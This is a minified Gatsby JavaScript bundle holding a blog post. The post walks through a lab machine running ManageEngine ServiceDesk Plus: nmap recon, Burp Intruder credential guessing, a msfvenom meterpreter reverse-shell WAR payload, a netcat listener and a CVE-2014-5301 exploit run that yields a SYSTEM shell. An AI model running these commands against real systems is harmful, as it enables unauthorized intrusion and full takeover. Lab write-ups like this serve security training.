"use strict";(self.webpackChunkminimal_blog=self.webpackChunkminimal_blog||[]).push([[952],{4765:function(e,t,n){n.d(t,{F:function(){return m},Z:function(){return d}});var a=n(7294),i=n(8733),l=n(795),r=n(8377),s=n(6799),o=n(8871);var c=e=>{let{post:t}=e;return null};const p=["16px","8px","4px"].map((e=>`rgba(0, 0, 0, 0.1) 0px ${e} ${e} 0px`));var g=e=>{let{data:{post:t},children:n}=e;return(0,i.tZ)(r.Z,null,(0,i.tZ)(l.X6,{as:"h1",variant:"styles.h1"},t.title),(0,i.tZ)("p",{sx:{color:"secondary",mt:3,a:{color:"secondary"},fontSize:[1,1,2]}},(0,i.tZ)("time",null,t.date),t.tags&&(0,i.tZ)(a.Fragment,null," — ",(0,i.tZ)(s.Z,{tags:t.tags})),t.timeToRead&&" — ",t.timeToRead&&(0,i.tZ)("span",null,t.timeToRead," min read")),(0,i.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:"4px",boxShadow:p.join(", "),".gatsby-resp-image-image":{borderRadius:"4px"}},variant:"layout.content"}},n),(0,i.tZ)(c,{post:t}))};const m=e=>{var t,n,a;let{data:{post:l}}=e;return(0,i.tZ)(o.Z,{title:l.title,description:l.description?l.description:l.excerpt,image:l.banner?null===(t=l.banner)||void 0===t||null===(n=t.childImageSharp)||void 0===n||null===(a=n.resize)||void 0===a?void 0:a.src:void 0,pathname:l.slug,canonicalUrl:l.canonicalUrl})};function d(e){let{...t}=e;return a.createElement(g,t)}},6799:function(e,t,n){var a=n(8733),i=n(7294),l=n(1883),r=n(3494),s=n(9706);t.Z=e=>{let{tags:t}=e;const{tagsPath:n,basePath:o}=(0,r.Z)();return(0,a.tZ)(i.Fragment,null,t.map(((e,t)=>(0,a.tZ)(i.Fragment,{key:e.slug},!!t&&", ",(0,a.tZ)(l.Link,{sx:e=>{var t;return{...null===(t=e.styles)||void 0===t?void 0:t.a}},to:(0,s.Z)(`/${o}/${n}/${e.slug}`)},e.name)))))}},8871:function(e,t,n){var a=n(7294),i=n(1883),l=n(4232);t.Z=e=>{let{title:t="",description:n="",pathname:r="",image:s="",children:o=null,canonicalUrl:c=""}=e;const p=(0,l.Z)(),{siteTitle:g,siteTitleAlt:m,siteUrl:d,siteDescription:u,siteImage:A,author:b,siteLanguage:h}=p,f={title:t?`${t} | ${g}`:m,description:n||u,url:`${d}${r||""}`,image:`${d}${s||A}`};return a.createElement(a.Fragment,null,a.createElement("html",{lang:h}),a.createElement("title",null,f.title),a.createElement("meta",{name:"description",content:f.description}),a.createElement("meta",{name:"image",content:f.image}),a.createElement("meta",{property:"og:title",content:f.title}),a.createElement("meta",{property:"og:url",content:f.url}),a.createElement("meta",{property:"og:description",content:f.description}),a.createElement("meta",{property:"og:image",content:f.image}),a.createElement("meta",{property:"og:type",content:"website"}),a.createElement("meta",{property:"og:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),a.createElement("meta",{name:"twitter:title",content:f.title}),a.createElement("meta",{name:"twitter:url",content:f.url}),a.createElement("meta",{name:"twitter:description",content:f.description}),a.createElement("meta",{name:"twitter:image",content:f.image}),a.createElement("meta",{name:"twitter:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:creator",content:b}),a.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,i.withPrefix)("/favicon-32x32.png")}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,i.withPrefix)("/favicon-16x16.png")}),a.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,i.withPrefix)("/apple-touch-icon.png")}),c?a.createElement("link",{rel:"canonical",href:c}):null,o)}},4323:function(e,t,n){n.r(t),n.d(t,{Head:function(){return s.F},default:function(){return o}});var a=n(7294),i=n(1151);function l(e){const t=Object.assign({span:"span",h1:"h1",h2:"h2",pre:"pre",code:"code",p:"p",a:"a",ul:"ul",li:"li"},(0,i.ah)(),e.components);return a.createElement(a.Fragment,null,a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 894px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 22.499999999999996%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAABDElEQVR42lWM2U6DQBiFeYQWZOkAZRkYQFq1rKKJkRhbFTXVCxsT9f3f4vjP1Bsvvpw5yz/aWnQokxZFXCvyqCLfYJV2kN1Z1v/rZbYWlKWURbXqzvNLpfJGe5++MF49kempGFDwBkN9h4fxDS+7A/aPn9RPdCA/H3B/86pyeVPEDcbrCc/bD+xov73dQ8t4iTjIEXqpgocFRFwi5SsIiXxHp0gIqcorjl4S+gLZ3177/mHIRIa27YkOjLkIghBN3aCqalSbSiFoM5vNkecFbMuCrutHn+W0q2AYBvS5Dm1z4WHp+ki4AI8TLGwG23TgMg8e85W6pAuHwTQsUpc+dGCd2Moz8sEyhGXail/aVpSucmrXZwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info"\n        title=""\n        src="/static/fc69aeee0986ddba89631e6fd3927566/c56e5/info.png"\n        srcset="/static/fc69aeee0986ddba89631e6fd3927566/5243c/info.png 240w,\n/static/fc69aeee0986ddba89631e6fd3927566/ab158/info.png 480w,\n/static/fc69aeee0986ddba89631e6fd3927566/c56e5/info.png 894w"\n        sizes="(max-width: 894px) 100vw, 894px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.h1,null,"Recon"),"\n",a.createElement(t.h2,null,"Nmap"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"nmap -sC -sV -Pn 192.168.229.43\n")),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 24.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA6klEQVR42m2QXXKDMAyEfZVOwk8KtjEYsA04KU3T5P4H2kpK2+lDH3Yk1tbyWWoYM0LasWw3nJoRc3z2g8/o/YZGTyhrh6LscPxRYb97i6Lq5KysHA7kqzV/YgpvEsQ1LVes+YbtfEe+PKg+4CjcuAWtCaKGpLtEPwvia5vghiy+4sG0fggVEy3Uc+hI4f14poub+LqLMtCY+KvWJFL8owTlhhWRAgwNMDpjvxw0irrHSc+oaQ3VqyeaGa0lMhv/lSFiluIn8FO7fnmS0BDvzfI3EfrpAk/nY9hpLe9ydwq7KKSrrEp8qhz4BXWnoNYoTVcNAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="nmap"\n        title=""\n        src="/static/518b4f4342e79a9ffa171a278180f214/7d769/nmap.png"\n        srcset="/static/518b4f4342e79a9ffa171a278180f214/5243c/nmap.png 240w,\n/static/518b4f4342e79a9ffa171a278180f214/ab158/nmap.png 480w,\n/static/518b4f4342e79a9ffa171a278180f214/7d769/nmap.png 960w,\n/static/518b4f4342e79a9ffa171a278180f214/87339/nmap.png 1440w,\n/static/518b4f4342e79a9ffa171a278180f214/88b03/nmap.png 1920w,\n/static/518b4f4342e79a9ffa171a278180f214/69d2d/nmap.png 1928w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.p,null,"The scan results indicate several open ports on the target system, including port 8080, which is running an Apache Tomcat/Coyote JSP engine\nhosting ManageEngine ServiceDesk Plus. Among these ports, port 8080 stands out as the best first course of action due to its potential for\nhosting web services and possibly providing access to the ManageEngine ServiceDesk Plus application. This port could be a valuable entry point\nfor further exploration and potential exploitation of the target system."),"\n",a.createElement(t.h1,null,"Vulnerability Identification and Exploitation"),"\n",a.createElement(t.p,null,a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 52.916666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABYlAAAWJQFJUiTwAAACZUlEQVR42nWS205TURCG99OYqDdybyRFTo9geAETUBLjIxhRSSBRb4iJCRckGLCVQ6Fgu3ugWGhLS6CWiDEYY4BYqD3t7nYf2s/Z3QG80JX8mVmz1pr1/zOjTE4tMD2zwqw3wsxcmLnFDcEm75e38K3uCDIsrF1ghw8BgdjLmOzn/Um8Yp9MvEX5cVZl3rdCMhbB1Io0aiWaukbbaoMNiPnnkni7JVZgmTZNw2YtpKLsHZ2ynsgJqyWSiU9oNQ1dN2g25VLTwjD+gjy88J1zXTfRNINyuU5V7LoaQ9nIfCX1Jce388/kDnPU643/EHKpGqaFbdu0Wi0sy8KUfV1r0DBaqNFNlK38Afs/kxyV8tTMEu22+7Al9rha4KRWoFgqcia+JmWoCXvDMGjodSrlMrVqhUqlLIxNYvFtlAXVy2Fxl/T3GGe1U/nZTdgWBvGdBKFkjGg0ihoJc3j8C02Y2JYtSuouQ0leKJx3appKZ1Gej41xcJIill8lnU+IBONKprB0EjvyHJkS6Eh0PtX1xqXsYvF3534ylUHZDoV5Nj7BbGCa3dw29arWaYYpDejAch65MIWZabhn7idOXBolcp2Ob8QTKPl0mhdPX+FfWkUvO2NT70gyJaklo9AZjfYVnBJLrk7cYdqy2zTkri6lCATDUsPlJO98CV5O+WWwI3j9KXyBjAxwluXgHv5QjsWP+yyJvxjcRw1m2IpmiYcdZNiMZFHXU0TVLK8n36D0Do3juTdG18BjbvU9ukRXv2tveka53v2QG4Jr3aPc9tynb2AYT/8IdwdG6B18IP4wPYOj9NwZ4g/rIf6IGNEIDgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="home"\n        title=""\n        src="/static/af1d31463b62c1f12b305378249ab9ec/7d769/home.png"\n        srcset="/static/af1d31463b62c1f12b305378249ab9ec/5243c/home.png 240w,\n/static/af1d31463b62c1f12b305378249ab9ec/ab158/home.png 480w,\n/static/af1d31463b62c1f12b305378249ab9ec/7d769/home.png 960w,\n/static/af1d31463b62c1f12b305378249ab9ec/87339/home.png 1440w,\n/static/af1d31463b62c1f12b305378249ab9ec/836e4/home.png 1644w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nAccessing port 8080 reveals the homepage of ManageEngine, as indicated by the version displayed in the bottom right corner. This suggests that\nthe port is actively hosting ManageEngine ServiceDesk Plus."),"\n",a.createElement(t.p,null,"Upon searching for an exploit for the identified version of ManageEngine ServiceDesk Plus, I found a relevant exploit at the following\nlink: ",a.createElement(t.a,{href:"https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py"},"CVE-2014-5301.py"),". This exploit targets vulnerabilities associated\nwith the specific version of ManageEngine ServiceDesk Plus, potentially providing a means for unauthorized access or further compromise of the system."),"\n",a.createElement(t.p,null,"The script instructs us to create a msfvenom payload using"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.229.43 LPORT=4444 -f war > shell.war\n")),"\n",a.createElement(t.p,null,"Now, the script also needs a valid username and password combination"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"I will use Burp to capture the login request and send it to intruder"),"\n",a.createElement(t.li,null,"set the type of attack to cluster bomb and create two entry points"),"\n"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 60.83333333333334%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAACA0lEQVR42n2TaZLaMBSEuQ4YbGuzLXnHgFmGya+kanKBHCKH7/STTTKVquRHl4yE+n1v0WbsOtznCy7zjPk6I9Q1XFGhrDysK2Cs+6cslRuHY2nw8z3gx7nEJtcWlfd4vtX4/jHiNAUaieFi+j9VPqCk6qrEe20we4NN5Wtcbzfc7jd0fRepXFH+Xv9WsUrOtbHQpFSk3CqLbU5DJYRrNB/qqFA3y94nktfvoqQIURSLoTIGTms8ao9vXcAmyzXSNIPmpg8hmomkRnmukKs/UtQ+U0h4J89SnueL0hRfWP+P54M15KXQdmj7EXXTomWTPBujGVmCqNVIG80mWFjuG61guB4OB+z3e2y3W4znC463u6RsaNCgn87ojxOapkHbkpK0cklMXqYvvWizLGN2KZIkgWNNi7JaCUnWjSfS9fDsuGFtpEby53hhl2C321HbVTtS7eKaJKI9gzAbwm0y1qTtB7TDEb4ZKTamZmoVUyw1oyp2l1SkWQh1rJvQCdlimkQzaVIkrEJDkw5fnwMe8xGOXX2eAx6U5TzaQlLnkDsZk5wN03FWFeuqjaR9iIGiYZrlpAhohguulxHTxOb0J35fcTmzDMMZTT8hdC3HRUamimvpGzh5TaVFSmIhlMnY5MpgGEYM4xSNHWvnPj05+RZZtzw1t652PTMcapnPhvWXSfkFWWyJbi++RlsAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="burp-intruder"\n        title=""\n        src="/static/da3b7cf7b9aeddd8a1ea3532f16cc0ac/7d769/burp-intruder.png"\n        srcset="/static/da3b7cf7b9aeddd8a1ea3532f16cc0ac/5243c/burp-intruder.png 240w,\n/static/da3b7cf7b9aeddd8a1ea3532f16cc0ac/ab158/burp-intruder.png 480w,\n/static/da3b7cf7b9aeddd8a1ea3532f16cc0ac/7d769/burp-intruder.png 960w,\n/static/da3b7cf7b9aeddd8a1ea3532f16cc0ac/87339/burp-intruder.png 1440w,\n/static/da3b7cf7b9aeddd8a1ea3532f16cc0ac/05775/burp-intruder.png 1768w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.p,null,"I found the username password combination ",a.createElement(t.code,null,"guest:guest")),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"we can use this combination for the python script"),"\n",a.createElement(t.li,null,"before executing the script start a listener"),"\n"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"nc -lnvp 4444\n")),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"python CVE-2014-5301.py TARGET_HOST TARGET_PORT guest guest WARFILE\n")),"\n",a.createElement(t.p,null,"My command looks like the following"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"python CVE-2014-5301.py 192.168.229.43 8080 guest guest shell.war\n")),"\n",a.createElement(t.p,null,"We now have a shell onManageEngine as the user nt authority\\system"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"the flag is ",a.createElement(t.code,null,"proof.txt")," in ",a.createElement(t.code,null,"C:\\Users\\Administrator\\Desktop")),"\n"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 827px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 31.25%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABIElEQVR42mWR227CMBBE8y9tA0mA0lwdxw52LnZKuAnap/7/d0zXRlRCfRjN+sFHM7tB3l3BzQ25PkL1J7TqgIINiNYV4k2NTSq9J07v3M8r8mhVYRGXpOJJgRrPaAcCEaw3F2hyoWa0+oBuvIDLCR+5Ql71XmmhvS+TCq+LAm/LZwV1O0NSuqI2KMUEJj8hdntwmiWB00IhShjWW0HJGnJJaTnB8n8wD/yZjviaTrBcYd9oyFxgS5B4XVNthjByVSqstg1BMq+XMPPAhz8BDe9gWwMrR1gxYMd7MGFR1gPt8l6z4iNYY3zdrHSVO/LOv13iMCr/FHCqpc0Vnb1hnL/RTzfo4ezFGouMPrsdxlQzotTuKG6+e40F7TKk4zz0Cx68xSyUpClZAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="proof"\n        title=""\n        src="/static/6871ea8cb35b7285b9e9bc670fa74070/99209/proof.png"\n        srcset="/static/6871ea8cb35b7285b9e9bc670fa74070/5243c/proof.png 240w,\n/static/6871ea8cb35b7285b9e9bc670fa74070/ab158/proof.png 480w,\n/static/6871ea8cb35b7285b9e9bc670fa74070/99209/proof.png 827w"\n        sizes="(max-width: 827px) 100vw, 827px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.h1,null,"Summary"),"\n",a.createElement(t.p,null,'We explored the process of identifying and exploiting vulnerabilities in ManageEngine ServiceDesk Plus, running on a target system with open port 8080. Utilizing reconnaissance techniques such as Nmap scanning, we discovered the presence of ManageEngine ServiceDesk Plus and identified a relevant exploit (CVE-2014-5301). By crafting a malicious payload and leveraging Burp Suite for capturing login credentials, we successfully gained unauthorized access to the system. This exploit granted us a shell as the user "nt authority\\system," enabling us to retrieve the flag located at C:\\Users\\Administrator\\Desktop\\proof.txt.'),"\n",a.createElement(t.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",a.createElement(t.p,null,"+10 points"))}var r=function(e){void 0===e&&(e={});const{wrapper:t}=Object.assign({},(0,i.ah)(),e.components);return t?a.createElement(t,e,a.createElement(l,e)):l(e)},s=n(4765);function o(e){return a.createElement(s.Z,e,a.createElement(r,e))}s.Z}}]);
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-helpdesk-index-mdx-ae8b5b96a338c4f639fa.js.map